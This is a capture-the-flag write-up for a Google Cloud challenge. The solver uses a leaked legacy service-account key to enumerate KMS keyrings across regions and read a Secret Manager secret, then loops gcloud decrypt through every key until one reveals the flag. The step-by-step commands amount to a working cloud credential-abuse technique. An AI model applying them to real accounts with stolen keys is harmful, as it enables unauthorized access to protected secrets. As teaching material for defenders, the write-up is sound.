# Solution

So this challenge was all about enumeration and finding what you can do with an old service account key that was kept around for legacy purposes.

If you have followed some of my other Cloud challenges from last year you would know that I love [this](https://gitlab.com/gitlab-com/gl-security/security-operations/gl-redteam/gcp_enum/-/blob/master/gcp_enum.sh) script from GitLab Red team on enumerating GCP resources So lets go ahead and use that and see what happens.

But before that we need to enable the service account key and make sure we are looking at the right project. So lets take a look at the key.

```json
{
  "type": "service_account",
  "project_id": "${SOME_PROJECT_NAME}",
  "private_key_id": "6baafbed73bf3181fd03b8d26f40eb53f235fe0f",
  "private_key": "-----BEGIN PRIVATE KEY-----<snip></snip>PRIVATE KEY-----\n",
  "client_email": "legacy-svc-account@${SOME_PROJECT_NAME}.iam.gserviceaccount.com",
  "client_id": "110800087806377709098",
  "auth_uri": "https://accounts.google.com/o/oauth2/auth",
  "token_uri": "https://oauth2.googleapis.com/token",
  "auth_provider_x509_cert_url": "https://www.googleapis.com/oauth2/v1/certs",
  "client_x509_cert_url": "https://www.googleapis.com/robot/v1/metadata/x509/legacy-svc-account%40${SOME_PROJECT_NAME}.iam.gserviceaccount.com"
}
```

Note that I have removed the private key and the project name given that these could change in the real challenge.

However this key gives us a bit of insight, we now know the project name. We know that the service account is called `legacy-svc-account`.

Cool lets go ahead and see what we can do with it. Activated the key with

`gcloud auth activate-service-account --key-file=legacy.json`

Then lets make sure we are looking at the right project but running:

`gcloud config set project ${SOME_PROJECT_NAME}`

NOTE: We get the project name from the Key above.

Okay so let's run the enumeration script from before and see what we get in the output. The script is a bit old so we get some false positives, but looking in the output folder from the script we can see what it actually found.

After scanning everything we only really get one result which is:
```
[*] Enumerating crypto keys
  [+] SUCCESS
  [!] FAIL
  [+] SUCCESS
```

And looking in `kms.txt` we see 

```
NAME
projects/cloudsupporthacks/locations/global/keyRings/empty-keyring
```

Hmm okay, so there is no keys in this keyring but surely this is here for a reason. It also tells us that we DO have permission to list keyrings. So maybe there are other keyrings we can't see.

A bit of research into this you should find that [keyrings](https://cloud.google.com/sdk/gcloud/reference/kms/keyrings/list) are coupled with a location and by default we are looking at the GLOBAL location.

So let's try and see if there are any other keyrings in any other region. So let's a get a list of all available regions in GCP. We quickly grab a list from online and put it together, or if you haver another GCP project you have access to you can run.

`gcloud compute regions list --format=value(name) > regions.txt`

Then lets try and list all the keyrings again but in each region so:

`for region in $(cat regions.txt); do gcloud kms keyrings list --location ${region}; done;`

And bingo from within the output we get

```
NAME
projects/cloudsupporthacks/locations/australia-southeast2/keyRings/wardens-locks
```

A keyring in the `australia-southeast2` region, this is good to know and to note down. Let's see if there are any keys in that keyring.

```bash
gcloud kms keys list --keyring wardens-locks --location australia-southeast2

NAME                                                                                                        PURPOSE          ALGORITHM                    PROTECTION_LEVEL  LABELS  PRIMARY_ID  PRIMARY_STATE
projects/cloudsupporthacks/locations/australia-southeast2/keyRings/wardens-locks/cryptoKeys/a-big-key       ENCRYPT_DECRYPT  GOOGLE_SYMMETRIC_ENCRYPTION  SOFTWARE                  1           ENABLED
projects/cloudsupporthacks/locations/australia-southeast2/keyRings/wardens-locks/cryptoKeys/a-bronze-key    ENCRYPT_DECRYPT  GOOGLE_SYMMETRIC_ENCRYPTION  SOFTWARE                  1           ENABLED
projects/cloudsupporthacks/locations/australia-southeast2/keyRings/wardens-locks/cryptoKeys/a-diamond-key   ENCRYPT_DECRYPT  GOOGLE_SYMMETRIC_ENCRYPTION  SOFTWARE                  1           ENABLED
projects/cloudsupporthacks/locations/australia-southeast2/keyRings/wardens-locks/cryptoKeys/a-fat-key       ENCRYPT_DECRYPT  GOOGLE_SYMMETRIC_ENCRYPTION  SOFTWARE                  1           ENABLED
projects/cloudsupporthacks/locations/australia-southeast2/keyRings/wardens-locks/cryptoKeys/a-filthy-key    ENCRYPT_DECRYPT  GOOGLE_SYMMETRIC_ENCRYPTION  SOFTWARE                  1           ENABLED
projects/cloudsupporthacks/locations/australia-southeast2/keyRings/wardens-locks/cryptoKeys/a-golden-key    ENCRYPT_DECRYPT  GOOGLE_SYMMETRIC_ENCRYPTION  SOFTWARE                  1           ENABLED
projects/cloudsupporthacks/locations/australia-southeast2/keyRings/wardens-locks/cryptoKeys/a-jail-key      ENCRYPT_DECRYPT  GOOGLE_SYMMETRIC_ENCRYPTION  SOFTWARE                  1           ENABLED
projects/cloudsupporthacks/locations/australia-southeast2/keyRings/wardens-locks/cryptoKeys/a-key-key       ENCRYPT_DECRYPT  GOOGLE_SYMMETRIC_ENCRYPTION  SOFTWARE                  1           ENABLED
projects/cloudsupporthacks/locations/australia-southeast2/keyRings/wardens-locks/cryptoKeys/a-northern-key  ENCRYPT_DECRYPT  GOOGLE_SYMMETRIC_ENCRYPTION  SOFTWARE                  1           ENABLED
projects/cloudsupporthacks/locations/australia-southeast2/keyRings/wardens-locks/cryptoKeys/a-secret-key    ENCRYPT_DECRYPT  GOOGLE_SYMMETRIC_ENCRYPTION  SOFTWARE                  1           ENABLED
projects/cloudsupporthacks/locations/australia-southeast2/keyRings/wardens-locks/cryptoKeys/a-silver-key    ENCRYPT_DECRYPT  GOOGLE_SYMMETRIC_ENCRYPTION  SOFTWARE                  1           ENABLED
projects/cloudsupporthacks/locations/australia-southeast2/keyRings/wardens-locks/cryptoKeys/a-small-key     ENCRYPT_DECRYPT  GOOGLE_SYMMETRIC_ENCRYPTION  SOFTWARE                  1           ENABLED
projects/cloudsupporthacks/locations/australia-southeast2/keyRings/wardens-locks/cryptoKeys/a-smart-key     ENCRYPT_DECRYPT  GOOGLE_SYMMETRIC_ENCRYPTION  SOFTWARE                  1           ENABLED
projects/cloudsupporthacks/locations/australia-southeast2/keyRings/wardens-locks/cryptoKeys/an-iron-key     ENCRYPT_DECRYPT  GOOGLE_SYMMETRIC_ENCRYPTION  SOFTWARE                  1           ENABLED

```

Jeez okay so now we have a whole lot of keys that are all enabled and can do SYMMETRIC_ENCRYPTION. 

There isn't really much else we can do with this since, we need something to encrypt/decrypt. To use this, so let's keep looking.

There has to be some other piece of data that we are missing. But after investigating the GCP_ENUM script we don't see anything. 

Going back to the challenge description we see the word `secretive` is in italics, is this a hint pointing towards Cloud Secrets?

Lets try and list the secrets in the project.

```bash
gcloud secrets list

NAME               CREATED              REPLICATION_POLICY  LOCATIONS
unused_data        2021-08-27T04:14:12  automatic           -
```

Bingo, another permission we have found we have is to list secrets. Can we... access the secrets? Let's try:

```
gcloud secrets versions list unused_data

NAME  STATE    CREATED              DESTROYED
1     enabled  2021-08-27T04:14:16  -
```

So there is only 1 version which is enabled lets try and grab it:

```bash
gcloud secrets versions access 1 --secret unused_data

CiQA2HYKWM869h0ZRmbEdHfu4AndTgPleZ7sklglz+ifGk/nBU8SZgDcCnx57Or2BojHjcMNJHv+++e6B0Heul1bagPi1xuQ5q+/riw7sy26bDUZpp8/105NI34IkszTMFBfsXvOgMqaMNBu/oGdL07hBLcS5ZCHLK7J9U9AhjZo457NiUcqfjg2u2ErZg==
```

Nice! Some base64, however if we base64 decode it, we just get random data...... encrypted data!

Let's try and use some of the keys from above to see if we can decrypt this data. Saving the decoded base64 to a file called secret.enc.

However we don't know which key to use... or how many. No problems lets just write another for loop.

So lets use [this](https://cloud.google.com/sdk/gcloud/reference/kms/decrypt) command as a reference so we can try this again.

First we need to export a list of the key names in the key ring:

```bash
gcloud kms keys list --keyring wardens-locks --location australia-southeast2 --format=value\(name\) | cut -d/ -f8

a-big-key
a-bronze-key
a-diamond-key
a-fat-key
a-filthy-key
a-golden-key
a-jail-key
a-key-key
a-northern-key
a-secret-key
a-silver-key
a-small-key
a-smart-key
an-iron-key
```

Let's save that to a file called keys.txt and give this another go:

```bash
for key in $(cat keys.txt); do echo Trying $key...; gcloud kms decrypt --key=$key --keyring=wardens-locks --location australia-southeast2 --ciphertext-file=./cipher.enc --plaintext-file=final.txt; done

Trying a-big-key...
ERROR: (gcloud.kms.decrypt) INVALID_ARGUMENT: Decryption failed: verify that 'name' refers to the correct CryptoKey.
Trying a-bronze-key...
ERROR: (gcloud.kms.decrypt) INVALID_ARGUMENT: Decryption failed: verify that 'name' refers to the correct CryptoKey.
Trying a-diamond-key...
ERROR: (gcloud.kms.decrypt) INVALID_ARGUMENT: Decryption failed: verify that 'name' refers to the correct CryptoKey.
Trying a-fat-key...
ERROR: (gcloud.kms.decrypt) INVALID_ARGUMENT: Decryption failed: verify that 'name' refers to the correct CryptoKey.
Trying a-filthy-key...
ERROR: (gcloud.kms.decrypt) INVALID_ARGUMENT: Decryption failed: verify that 'name' refers to the correct CryptoKey.
Trying a-golden-key...
ERROR: (gcloud.kms.decrypt) INVALID_ARGUMENT: Decryption failed: verify that 'name' refers to the correct CryptoKey.
Trying a-jail-key...
ERROR: (gcloud.kms.decrypt) INVALID_ARGUMENT: Decryption failed: verify that 'name' refers to the correct CryptoKey.
Trying a-key-key...
ERROR: (gcloud.kms.decrypt) INVALID_ARGUMENT: Decryption failed: verify that 'name' refers to the correct CryptoKey.
Trying a-northern-key...
ERROR: (gcloud.kms.decrypt) INVALID_ARGUMENT: Decryption failed: verify that 'name' refers to the correct CryptoKey.
Trying a-secret-key...
ERROR: (gcloud.kms.decrypt) INVALID_ARGUMENT: Decryption failed: verify that 'name' refers to the correct CryptoKey.
Trying a-silver-key...
Trying a-small-key...
ERROR: (gcloud.kms.decrypt) INVALID_ARGUMENT: Decryption failed: verify that 'name' refers to the correct CryptoKey.
Trying a-smart-key...
ERROR: (gcloud.kms.decrypt) INVALID_ARGUMENT: Decryption failed: verify that 'name' refers to the correct CryptoKey.
Trying an-iron-key...
ERROR: (gcloud.kms.decrypt) INVALID_ARGUMENT: Decryption failed: verify that 'name' refers to the correct CryptoKey.
```

This doesn't look promising. However, we see that final.txt was actually created! And a-silver-key didn't error out. Looking at `final.txt`

We get the flag!

`DUCTF{its_time_to_clean_up_your_service_account_permissions!}`


